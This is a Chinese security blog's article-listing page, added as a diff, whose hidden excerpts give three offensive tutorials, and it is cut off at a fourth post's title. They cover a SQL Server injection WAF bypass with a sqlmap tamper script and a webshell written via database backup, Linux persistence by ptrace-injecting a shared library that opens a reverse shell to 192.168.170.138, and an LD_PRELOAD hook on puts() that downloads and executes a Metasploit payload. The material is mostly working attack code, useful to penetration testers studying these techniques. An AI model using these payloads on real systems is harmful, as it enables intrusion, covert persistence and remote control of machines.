@@ -1,0 +1,1043 @@
+<!DOCTYPE html>
+<html>
+
+  <head>
+<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  <title>倾旋的博客</title>
+  <meta name="description" content="这个博客主要用来记录自己技术生涯中短小的收获和知识的备忘，还有就是一些做安全服务工作中的感受。方向可能会在不断改变：渗透测试、CTF、高效生活、应急响应、安全建设、读后感、代码审计、漏洞复现、运维杂项等等…
+">
+
+  <link rel="stylesheet" href="/css/main.css">
+  <link rel="canonical" href="https://payloads.online/page6/">
+  <link rel="alternate" type="application/rss+xml" title="倾旋的博客" href="https://payloads.online/feed.xml">
+</head>
+
+
+  <body>
+
+    <div class="header-placeholder"></div>
+<header class="header">
+  <div class="wrapper">
+    <div id="sidebar-toggle">TOC</div>
+    <a class="site-title" href="/">倾旋的博客</a>
+    <nav class="site-nav">
+      
+        
+        <a class="page-link" href="/about/">About</a>
+      
+        
+        <a class="page-link" href="/posts/">Posts</a>
+      
+        
+        <a class="page-link" href="/links/">Links</a>
+      
+        
+        <a class="page-link" href="https://cooolis.payloads.online/">Cooolis</a>
+      
+        
+        <a class="page-link" href="/feed.xml">RSS</a>
+      
+    </nav>
+  </div>
+</header>
+
+
+    <div class="page-content">
+      <div class="wrapper">
+        <div class="col-main">
+          <div class="home">
+  <a class="rss-link" href="/feed.xml">RSS Feed</a>
+  <h1 class="page-heading">Articles</h1>
+
+  <ul class="post-list">
+    
+      <li>
+        <h2>
+          <a class="post-link" href="/archivers/2020-01-01/3">SQL Server DBA WriteFile</a>
+        </h2>
+        
+        <div class="post-meta">Jan 1, 2020</div>
+
+        <div class="post-excerpt">
+          <!--<h2 id="0x01-前言">0x01 前言</h2>
+
+<p>本文非基础类的普及文章，主要分享内网中遇到的一个有趣案例。</p>
+
+<h2 id="0x02-bypass注入点">0x02 Bypass注入点</h2>
+
+<p>通常情况下，遇到SQL Server注入点，我会比较关注是否是DBA权限，如果是，那么就可能拿到执行命令的权限，进而反弹到Ｃ2上，方便后续的后渗透工作。</p>
+
+<p>一开始在一处比较复杂的功能点发现了SQL Server的注入，也是首先利用AND进行判断：</p>
+
+<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/ff14d4d92d1d2c87226c80bf934d541f.png" alt="2020-01-03-13-13-15" /></p>
+
+<p>参数：ModuleType存在注入点，但是后面有一层站点全局输入的检测机制，从简单的测试来看，是不存在语法分析的一种，比较容易绕过。</p>
+
+<p>我尝试了以下方案：</p>
+
+<ol>
+  <li><code class="language-plaintext highlighter-rouge">and -&gt; And</code></li>
+  <li><code class="language-plaintext highlighter-rouge">and -&gt; /**/And</code></li>
+  <li><code class="language-plaintext highlighter-rouge">and -&gt; /*xsww!s*/And</code></li>
+  <li><code class="language-plaintext highlighter-rouge">and -&gt; /*xswwS1154-_[0)}!s*/And</code></li>
+  <li><code class="language-plaintext highlighter-rouge">and -&gt; /***/And</code></li>
+</ol>
+
+<p>最终发现第五种可以绕过，使得后端无法辨别<code class="language-plaintext highlighter-rouge">/***/</code>是否和And是一个本体。</p>
+
+<p>那么我猜想到了一个简单的表达式，似乎和这个过滤规则比较相向：<code class="language-plaintext highlighter-rouge">/*\w{0,}*/</code></p>
+
+<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/6698199e49414f5cdf5e0cb74725decb.png" alt="2020-01-03-13-13-28" /></p>
+
+<h2 id="0x03-tamper-自动化实现">0x03 tamper 自动化实现</h2>
+
+<p>这里我比较懒，直接改了以下space2comment.py，这个脚本在Kali Linux中的sqlmap目录下：</p>
+
+<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/b5b958529f18b8b570f16eca2cd1ac03.png" alt="2020-01-03-13-13-37" /></p>
+
+<p>核心代码：</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">xrange</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">payload</span><span class="p">)):</span>
+            <span class="k">if</span> <span class="ow">not</span> <span class="n">firstspace</span><span class="p">:</span>
+                <span class="k">if</span> <span class="n">payload</span><span class="p">[</span><span class="n">i</span><span class="p">].</span><span class="n">isspace</span><span class="p">():</span>
+                    <span class="n">firstspace</span> <span class="o">=</span> <span class="bp">True</span>
+                    <span class="n">retVal</span> <span class="o">+=</span> <span class="s">"/**/"</span>
+                    <span class="k">continue</span>
+
+            <span class="k">elif</span> <span class="n">payload</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">==</span> <span class="s">'</span><span class="se">\'</span><span class="s">'</span><span class="p">:</span>
+                <span class="n">quote</span> <span class="o">=</span> <span class="ow">not</span> <span class="n">quote</span>
+
+            <span class="k">elif</span> <span class="n">payload</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">==</span> <span class="s">'"'</span><span class="p">:</span>
+                <span class="n">doublequote</span> <span class="o">=</span> <span class="ow">not</span> <span class="n">doublequote</span>
+
+            <span class="k">elif</span> <span class="n">payload</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">==</span> <span class="s">" "</span> <span class="ow">and</span> <span class="ow">not</span> <span class="n">doublequote</span> <span class="ow">and</span> <span class="ow">not</span> <span class="n">quote</span><span class="p">:</span>
+                <span class="n">retVal</span> <span class="o">+=</span> <span class="s">"/**/"</span>
+                <span class="k">continue</span>
+</code></pre></div></div>
+
+<p>只需要替换<code class="language-plaintext highlighter-rouge">/**/</code>即可：</p>
+
+<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/cb7b577625d7a6106e39687558cdc6c7.png" alt="2020-01-03-13-13-49" /></p>
+
+<p>接着，就可以跑出注入了~</p>
+
+<p>PS：我比较习惯于添加<code class="language-plaintext highlighter-rouge">--random-agent</code>参数，理由是在注入的过程中，避免被流量感知设备发现。</p>
+
+<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/1ea40c2f77061bc94c939aaf8a1c01a5.png" alt="2020-01-03-13-14-00" /></p>
+
+<h2 id="0x04-xp_cmdshell">0x04 xp_cmdshell</h2>
+
+<p>到这一步的时候，我遇到了一个问题，SQLMAP调用exec master..xp_cmshell的时候被拦截了，因为后端还检测是否有<code class="language-plaintext highlighter-rouge">exec</code>、<code class="language-plaintext highlighter-rouge">master</code>，于是我还要将tamper加两句：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>payload = payload.replace("exec","/***/Execute/***/")
+payload = payload.replace("master..","/***//***/")
+</code></pre></div></div>
+
+<p>最终结果：<code class="language-plaintext highlighter-rouge">/***/execute/***//***/xp_cmdshell/***/'whoami'</code></p>
+
+<p>点击发包，还是无法执行，被360拦截了！</p>
+
+<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/fc6bd35eb07d11206d2bcf9ccb701553.png" alt="2020-01-03-13-14-22" /></p>
+
+<p>这个Error Code 5 ，是Windows的错误代码，中文意思就是：“拒绝访问”。</p>
+
+<p>现在xp_cmdshell被拦截的很多了，但是sp_oacreate应该可以使用的：</p>
+
+<p>参考我之前写的一篇文章：<a href="https://payloads.online/archivers/2019-07-19/1">Regsvr32 ole对象</a></p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>declare @shell int exec sp_oacreate 'wscript.shell',@shell output exec sp_oamethod @shell,'run',null,'c:\windows\system32\cmd.exe /c whoami &gt;C:\who.txt'
+</code></pre></div></div>
+
+<blockquote>
+  <p>后续我发现该服务器无法出网，还是站库分离</p>
+</blockquote>
+
+<p><strong>因此无法执行操作系统命令</strong></p>
+
+<h2 id="0x05-写入文件">0x05 写入文件</h2>
+
+<p>在写文件这块，我浪费了大量的时间，首先要确定能否向站点目录写文件，当前写文件的操作是否被拦截等等因素。</p>
+
+<p>一开始的思路是调用xp_cmdshell，采用echo去写，目前已无法执行命令，就此作罢，吸了一口芙蓉王，精神焕发，遂查到数据库备份的方式。</p>
+
+<p>提交：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>{"ClientType": "", "ClientGuid": "09a37ee1-5ec3-46db-9279-4cb066622e8d", "ModuleType": "A2501';use test222;create table [dbo].[test2] ([cmd] [image]);insert/***/into/***/test2(cmd) values(0x3c3f70687020706870696e666f28293b3f3e);backup database test222 to disk='C:\test2.bak' WITH DIFFERENTIAL,FORMAT;-- ", "IsBackEnd": false }
+</code></pre></div></div>
+
+<p>页面返回正常。</p>
+
+<p>但是，我的站点目录如果是中文呢？在Burp里处理就非常麻烦！</p>
+
+<p>还记得之前的IIS 7.5吗，<strong>IIS在接收到一个请求后，会自动将数据进行Unicode解码，如果流量设备、WAF不支持此特性的话，就可以进行绕过</strong>，这里我着重解决中文目录的问题。</p>
+
+<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/259de32b7fe3faac8fa6bff186660e07.png" alt="2020-01-03-13-14-38" /></p>
+
+<p>到这此文就结束了，我并没有成功Getshell，只是回顾我解决问题的思维方式，希望能对大家有用！</p>
+
+-->
+          <!---->
+          通常情况下，遇到SQL Server注入点，我会比较关注是否是DBA权限，如果是，那么就可能拿到执行命令的权限，进而反弹到Ｃ2上，方便后续的后渗透工作。
+          <p>
+            <a class="post-link" href="/archivers/2020-01-01/3">Read More »</a>
+          </p>
+        </div>
+      </li>
+    
+      <li>
+        <h2>
+          <a class="post-link" href="/archivers/2020-01-01/2">Linux权限维持之进程注入</a>
+        </h2>
+        
+        <div class="post-meta">Jan 1, 2020</div>
+
+        <div class="post-excerpt">
+          <!--<h2 id="说明">说明</h2>
+
+<p>通过进程注入技术，能够使得动态链接库被加载到一个正在运行的进程，因此较为隐蔽。进程注入通过调用<code class="language-plaintext highlighter-rouge">ptrace()</code>实现了与Windows平台下相同作用的API 函数<code class="language-plaintext highlighter-rouge">CreateRemoteThread()</code>。在许多Linux发行版中，内核的默认配置文件<code class="language-plaintext highlighter-rouge">/proc/sys/kernel/yama/ptrace_scope</code>限制了一个进程除了<code class="language-plaintext highlighter-rouge">fork()</code>派生外，无法通过<code class="language-plaintext highlighter-rouge">ptrace()</code>来操作另外一个进程。</p>
+
+<p>要注入进程前，需要关闭这个限制（Root权限）：</p>
+
+<p><code class="language-plaintext highlighter-rouge">echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope</code></p>
+
+<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/28f181718173d69326f3bfc58a3c0cbb.png" alt="2020-01-03-13-10-44" /></p>
+
+<p>在Github上已经有了关于进程注入的实现代码：<code class="language-plaintext highlighter-rouge">https://github.com/gaffe23/linux-inject</code></p>
+
+<p>下载后进入项目目录，执行：make x86_64 即可编译64位的linux-inject。</p>
+
+<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/7b89dc61d7952191a608716bdcf951b8.png" alt="2020-01-03-13-10-54" /></p>
+
+<p>确认编译是否正常：</p>
+
+<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/8251535f3c0f9b55243940b6de2cf34b.png" alt="2020-01-03-13-11-04" /></p>
+
+<p>获取sample-target的PID后，调用inject程序来注入sample-library.so，注入成功会输出“I just got loaded”。
+接下来，需要更改sample-target.c文件，编译成需要的权限维持动态链接库。</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include &lt;stdio.h&gt;
+#include &lt;unistd.h&gt;
+#include &lt;dlfcn.h&gt;
+#include &lt;stdlib.h&gt;
+</span>
+
+<span class="kt">void</span> <span class="nf">shell</span><span class="p">()</span>
+<span class="p">{</span>
+	<span class="n">printf</span><span class="p">(</span><span class="s">"I just got loaded</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+    <span class="n">system</span><span class="p">(</span><span class="s">"bash -c </span><span class="se">\"</span><span class="s">bash -i &gt;&amp; /dev/tcp/192.168.170.138/139 0&gt;&amp;1</span><span class="se">\"</span><span class="s">"</span><span class="p">);</span>
+   
+<span class="p">}</span>
+
+
+<span class="n">__attribute__</span><span class="p">((</span><span class="n">constructor</span><span class="p">))</span>
+<span class="kt">void</span> <span class="nf">loadMsg</span><span class="p">()</span>
+<span class="p">{</span>
+   <span class="n">shell</span><span class="p">();</span>
+<span class="p">}</span>
+
+</code></pre></div></div>
+
+<p>通过如下命令编译so文件：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>clang -std=gnu99 -ggdb -D_GNU_SOURCE -shared -o u9.so -lpthread -fPIC U3.c
+
+</code></pre></div></div>
+
+<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/ae110053d720c18b8c6bfb24a5483d4b.png" alt="2020-01-03-13-11-16" /></p>
+
+<p>编译成so文件成功后的测试效果：</p>
+
+<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/d23ecdf9310a3dce4fd8839d9d10e270.png" alt="2020-01-03-13-11-27" /></p>
+
+<p>在Kali Linux这边获得了bash shell：</p>
+
+<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/c2d15b84db450b39e55766b2097fd0c2.png" alt="2020-01-03-13-11-47" /></p>
+
+<p>此时发现测试程序的主线程被bash阻塞了，于是可以采用多线程技术，将后门代码与正常逻辑分离执行。</p>
+
+<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/9e990f101b1f5bee215f4175926ac896.png" alt="2020-01-03-13-11-58" /></p>
+
+<p>但利用这种方式在执行的过程中，查看进程参数还是会被查看到IP地址和端口：</p>
+
+<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/b920dfc70a90769b21214fd5d217dbbc.png" alt="2020-01-03-13-12-09" /></p>
+
+<p>查看到IP与端口：</p>
+
+<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/5f6901fde3fc0693424326f3deeede92.png" alt="2020-01-03-13-12-19" /></p>
+
+<p>再继续改进代码，采用socket套接字的方式来反弹shell：</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include &lt;stdio.h&gt;
+#include &lt;dlfcn.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;pthread.h&gt;
+#include &lt;stdio.h&gt;
+#include &lt;sys/types.h&gt;
+#include &lt;sys/socket.h&gt;
+#include &lt;unistd.h&gt;
+#include &lt;fcntl.h&gt;
+#include &lt;stdio.h&gt;
+#include &lt;sys/types.h&gt;
+#include &lt;sys/socket.h&gt;
+#include &lt;netinet/in.h&gt;
+#include &lt;netdb.h&gt;
+</span>
+
+<span class="k">static</span> <span class="kt">void</span> <span class="o">*</span> <span class="nf">hello</span><span class="p">()</span>
+<span class="p">{</span>
+
+    <span class="k">struct</span> <span class="n">sockaddr_in</span> <span class="n">server</span><span class="p">;</span>
+    <span class="kt">int</span> <span class="n">sock</span><span class="p">;</span>
+    <span class="kt">char</span> <span class="n">shell</span><span class="p">[]</span><span class="o">=</span><span class="s">"/bin/bash"</span><span class="p">;</span>
+    <span class="k">if</span><span class="p">((</span><span class="n">sock</span> <span class="o">=</span> <span class="n">socket</span><span class="p">(</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">SOCK_STREAM</span><span class="p">,</span> <span class="mi">0</span><span class="p">))</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
+        <span class="k">return</span> <span class="nb">NULL</span><span class="p">;</span>
+    <span class="p">}</span>
+
+    <span class="n">server</span><span class="p">.</span><span class="n">sin_family</span> <span class="o">=</span> <span class="n">AF_INET</span><span class="p">;</span>
+    <span class="n">server</span><span class="p">.</span><span class="n">sin_port</span> <span class="o">=</span> <span class="n">htons</span><span class="p">(</span><span class="mi">139</span><span class="p">);</span>
+    <span class="n">server</span><span class="p">.</span><span class="n">sin_addr</span><span class="p">.</span><span class="n">s_addr</span> <span class="o">=</span> <span class="n">inet_addr</span><span class="p">(</span><span class="s">"192.168.170.138"</span><span class="p">);</span>
+    <span class="k">if</span><span class="p">(</span><span class="n">connect</span><span class="p">(</span><span class="n">sock</span><span class="p">,</span> <span class="p">(</span><span class="k">struct</span> <span class="n">sockaddr</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">server</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="k">struct</span> <span class="n">sockaddr</span><span class="p">))</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
+        <span class="k">return</span> <span class="nb">NULL</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="n">dup2</span><span class="p">(</span><span class="n">sock</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+    <span class="n">dup2</span><span class="p">(</span><span class="n">sock</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>
+    <span class="n">dup2</span><span class="p">(</span><span class="n">sock</span><span class="p">,</span> <span class="mi">2</span><span class="p">);</span>
+    <span class="n">execl</span><span class="p">(</span><span class="n">shell</span><span class="p">,</span><span class="s">"/bin/bash"</span><span class="p">,(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="mi">0</span><span class="p">);</span>
+    <span class="n">close</span><span class="p">(</span><span class="n">sock</span><span class="p">);</span>
+	<span class="n">printf</span><span class="p">(</span><span class="s">"I just got loaded</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+    <span class="k">return</span> <span class="nb">NULL</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="n">__attribute__</span><span class="p">((</span><span class="n">constructor</span><span class="p">))</span>
+<span class="kt">void</span> <span class="nf">loadMsg</span><span class="p">()</span>
+<span class="p">{</span>
+    <span class="n">pthread_t</span> <span class="n">thread_id</span><span class="p">;</span>
+    <span class="n">pthread_create</span><span class="p">(</span><span class="o">&amp;</span><span class="n">thread_id</span><span class="p">,</span><span class="nb">NULL</span><span class="p">,</span><span class="n">hello</span><span class="p">,</span><span class="nb">NULL</span><span class="p">);</span>
+<span class="p">}</span>
+
+
+</code></pre></div></div>
+
+<p>执行效果：</p>
+
+<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/fa4136ff8822c555b4008bce084f88a4.png" alt="2020-01-03-13-12-35" /></p>
+
+<p>Kali Linux获得bash shell：</p>
+
+<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/003ee8252435ab25e2b012763fbf8d82.png" alt="2020-01-03-13-12-46" /></p>
+
+<p>在实战应用中，需要关闭ptrace的限制，然后注入.so到某个服务进程中，这样达到权限维持的目的。</p>
+
+-->
+          通过进程注入技术，能够使得动态链接库被加载到一个正在运行的进程，因此较为隐蔽。
+          <p>
+            <a class="post-link" href="/archivers/2020-01-01/2">Read More »</a>
+          </p>
+        </div>
+      </li>
+    
+      <li>
+        <h2>
+          <a class="post-link" href="/archivers/2020-01-01/1">Linux权限维持之LD_PRELOAD</a>
+        </h2>
+        
+        <div class="post-meta">Jan 1, 2020</div>
+
+        <div class="post-excerpt">
+          <!--<h2 id="ld_preload">LD_PRELOAD</h2>
+
+<p>Linux操作系统的动态链接库在加载过程中，动态链接器会先读取LD_PRELOAD环境变量和默认配置文件<code class="language-plaintext highlighter-rouge">/etc/ld.so.preload</code>，并将读取到的动态链接库文件进行预加载，即使程序不依赖这些动态链接库，LD_PRELOAD环境变量和<code class="language-plaintext highlighter-rouge">/etc/ld.so.preload</code>配置文件中指定的动态链接库依然会被装载,因为它们的优先级比LD_LIBRARY_PATH环境变量所定义的链接库查找路径的文件优先级要高，所以能够提前于用户调用的动态库载入。</p>
+
+<p>通过LD_PRELOAD环境变量，能够轻易的加载一个动态链接库。通过这个动态库劫持系统API函数，每次调用都会执行植入的代码。</p>
+
+<h2 id="dlsym">dlsym</h2>
+
+<p><strong>dlsym是一个计算机函数，功能是根据动态链接库操作句柄与符号，返回符号对应的地址，不但可以获取函数地址，也可以获取变量地址。</strong></p>
+
+<p>dlsym定义在Linux操作系统中的dlfcn.h中，函数原型如下：</p>
+
+<blockquote>
+  <p>void * dlsym(void * handle,const char * symbol)</p>
+</blockquote>
+
+<ul>
+  <li>handle：由dlopen打开动态链接库后返回的指针；</li>
+  <li>symbol：要求获取的函数或全局变量的名称。</li>
+</ul>
+
+<p>返回值：void * 指向函数的地址，供调用使用。</p>
+
+<p>劫持示例代码：</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include &lt;stdio.h&gt;
+#include &lt;unistd.h&gt;
+#include &lt;dlfcn.h&gt;
+#include &lt;stdlib.h&gt;
+</span>
+<span class="kt">int</span> <span class="nf">puts</span><span class="p">(</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">message</span><span class="p">)</span> <span class="p">{</span>
+  <span class="kt">int</span> <span class="p">(</span><span class="o">*</span><span class="n">new_puts</span><span class="p">)(</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">message</span><span class="p">);</span>
+  <span class="kt">int</span> <span class="n">result</span><span class="p">;</span>
+  <span class="n">new_puts</span> <span class="o">=</span> <span class="n">dlsym</span><span class="p">(</span><span class="n">RTLD_NEXT</span><span class="p">,</span> <span class="s">"puts"</span><span class="p">);</span>
+<span class="c1">// do some thing …</span>
+<span class="c1">// 这里是puts调用之前</span>
+  <span class="n">result</span> <span class="o">=</span> <span class="n">new_puts</span><span class="p">(</span><span class="n">message</span><span class="p">);</span>
+  <span class="c1">// 这里是puts调用之后</span>
+  <span class="k">return</span> <span class="n">result</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>编译命令：</p>
+
+<p><code class="language-plaintext highlighter-rouge">gcc hook.c -o hook.so -fPIC -shared -ldl -D_GNU_SOURCE</code></p>
+
+<ul>
+  <li>-fPIC 选项作用于编译阶段，告诉编译器产生与位置无关代码（Position-Independent Code）；这样一来，产生的代码中就没有绝对地址了，全部使用相对地址，所以代码可以被加载器加载到内存的任意位置，都可以正确的执行。这正是共享库所要求的，共享库被加载时，在内存的位置不是固定的。</li>
+  <li>-shared 生成共享库格式</li>
+  <li>-ldl 显示方式加载动态库，可能会调用dlopen、dlsym、dlclose、dlerror</li>
+  <li>-D_GNU_SOURCE 以GNU规范标准编译</li>
+</ul>
+
+<p>编写好劫持puts函数的代码后，需要先生成一个Metasploit木马，使得在系统调用puts函数之前，都执行一次木马。</p>
+
+<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/a981d7261f39ee47c93b0e42a8a68a39.png" alt="2020-01-03-13-09-24" /></p>
+
+<p><code class="language-plaintext highlighter-rouge">exploit/multi/script/web_delivery</code> 模块能够直接生成一条Python命令，这能够非常方便的获得Meterpreter。
+接下来，将劫持puts函数的代码做一些小改动，在执行puts之前，调用系统函数system来运行python命令，这样每次调用puts都可以获得Meterpreter会话。</p>
+
+<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/453478b8e6f0c711e8e33e92ff55600e.png" alt="2020-01-03-13-09-40" /></p>
+
+<p>正常执行的过程：</p>
+
+<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/00ff5dc344eedf05cecd3480d2396db1.png" alt="2020-01-03-13-09-51" /></p>
+
+<p>执行whoami后，由于底层会调用puts函数，因此也会执行python命令，Metasploit不出意外的获得了Meterpreter：</p>
+
+<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/ad5b8eaa7081113775743b6929919ee4.png" alt="2020-01-03-13-10-01" /></p>
+
+<p>接着，为了防止在短时间内获得多个重复的会话，因此需要优化一下代码，例如以某个文件行数和调用puts函数的次数进行取余，就能够达到执行多少次puts函数获得一次Meterpreter。
+优化代码如下：</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+<span class="cp">#include &lt;unistd.h&gt;
+#include &lt;dlfcn.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;sys/stat.h&gt;
+#define BUFFER_SIZE 100
+#define COMMAND_NUM 5
+</span><span class="kt">int</span> <span class="nf">check_file_line</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span> <span class="n">filename</span><span class="p">){</span>
+	<span class="kt">int</span> <span class="n">file_line</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+	<span class="kt">char</span> <span class="n">buffer</span><span class="p">[</span><span class="n">BUFFER_SIZE</span><span class="p">];</span>
+	<span class="kt">FILE</span> <span class="o">*</span><span class="n">fp</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
+	<span class="n">fp</span> <span class="o">=</span> <span class="n">fopen</span><span class="p">(</span><span class="n">filename</span><span class="p">,</span><span class="s">"r"</span><span class="p">);</span>
+	<span class="k">if</span><span class="p">(</span><span class="n">fp</span><span class="o">==</span><span class="nb">NULL</span><span class="p">){</span>
+		<span class="k">return</span> <span class="n">file_line</span><span class="p">;</span>
+	<span class="p">}</span>
+
+	<span class="k">while</span><span class="p">(</span><span class="n">fgets</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span><span class="n">BUFFER_SIZE</span><span class="p">,</span><span class="n">fp</span><span class="p">)</span><span class="o">!=</span> <span class="nb">NULL</span><span class="p">){</span>
+		<span class="n">file_line</span> <span class="o">++</span><span class="p">;</span>
+	<span class="p">}</span>
+	<span class="n">fclose</span><span class="p">(</span><span class="n">fp</span><span class="p">);</span>
+	<span class="k">return</span> <span class="n">file_line</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="kt">void</span> <span class="nf">add_file_line</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span> <span class="n">filename</span><span class="p">){</span>
+	<span class="kt">FILE</span> <span class="o">*</span> <span class="n">fp</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
+	<span class="n">fp</span> <span class="o">=</span> <span class="n">fopen</span><span class="p">(</span><span class="n">filename</span><span class="p">,</span><span class="s">"a+"</span><span class="p">);</span>
+	<span class="k">if</span><span class="p">(</span><span class="n">fp</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">){</span>
+		<span class="k">return</span><span class="p">;</span>
+	<span class="p">}</span>
+	
+	<span class="n">fputs</span><span class="p">(</span><span class="s">"1</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span><span class="n">fp</span><span class="p">);</span>
+	<span class="n">fclose</span><span class="p">(</span><span class="n">fp</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="kt">void</span> <span class="nf">call_system</span><span class="p">(){</span>
+
+  <span class="n">system</span><span class="p">(</span><span class="s">"python -c </span><span class="se">\"</span><span class="s">import sys;u=__import__('urllib'+{2:'',3:'.request'}[sys.version_info[0]],fromlist=('urlopen',));r=u.urlopen('http://192.168.170.138:8080/o1ZJy3Wue');exec(r.read());</span><span class="se">\"</span><span class="s">"</span><span class="p">);</span>
+
+<span class="p">}</span>
+
+<span class="kt">int</span> <span class="nf">puts</span><span class="p">(</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">message</span><span class="p">)</span> <span class="p">{</span>
+  <span class="kt">char</span> <span class="o">*</span> <span class="n">filename</span> <span class="o">=</span> <span class="s">"/tmp/err.log"</span><span class="p">;</span>
+  <span class="kt">int</span> <span class="p">(</span><span class="o">*</span><span class="n">new_puts</span><span class="p">)(</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">message</span><span class="p">);</span>
+  <span class="kt">int</span> <span class="n">result</span><span class="p">;</span>
+  <span class="kt">int</span> <span class="n">file_lines</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+  <span class="n">new_puts</span> <span class="o">=</span> <span class="n">dlsym</span><span class="p">(</span><span class="n">RTLD_NEXT</span><span class="p">,</span> <span class="s">"puts"</span><span class="p">);</span>
+  <span class="n">add_file_line</span><span class="p">(</span><span class="n">filename</span><span class="p">);</span>
+  <span class="n">file_lines</span> <span class="o">=</span> <span class="n">check_file_line</span><span class="p">(</span><span class="n">filename</span><span class="p">);</span>
+  <span class="n">printf</span><span class="p">(</span><span class="s">"[+]file_line : %d, NUM = %d </span><span class="se">\n</span><span class="s">"</span><span class="p">,</span><span class="n">file_lines</span><span class="p">,</span> <span class="n">COMMAND_NUM</span><span class="p">);</span>
+  <span class="k">if</span><span class="p">(</span><span class="n">file_lines</span> <span class="o">%</span> <span class="n">COMMAND_NUM</span> <span class="o">==</span> <span class="mi">0</span><span class="p">){</span>
+  	<span class="n">call_system</span><span class="p">();</span>
+  <span class="p">}</span>
+  <span class="n">result</span> <span class="o">=</span> <span class="n">new_puts</span><span class="p">(</span><span class="n">message</span><span class="p">);</span>
+  <span class="k">return</span> <span class="n">result</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/6923c9d63c7a4b9563bd298f01df9c98.png" alt="2020-01-03-13-10-13" /></p>
+
+<p>在执行至第零次、五次时，成功返回了会话：</p>
+
+<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/7462655c88874bbc909aa75c7cb940f2.png" alt="2020-01-03-13-10-21" /></p>
+
+<p>COMMAND_NUM 可自定义</p>
+-->
+          通过LD_PRELOAD环境变量，能够轻易的加载一个动态链接库。通过这个动态库劫持系统API函数，每次调用都会执行植入的代码。
+          <p>
+            <a class="post-link" href="/archivers/2020-01-01/1">Read More »</a>
+          </p>
+        </div>
+      </li>
+    
+      <li>
+        <h2>
+          <a class="post-link" href="/archivers/2019-11-10/5">静态恶意代码逃逸（第五课）</a>
+        </h2>
+        
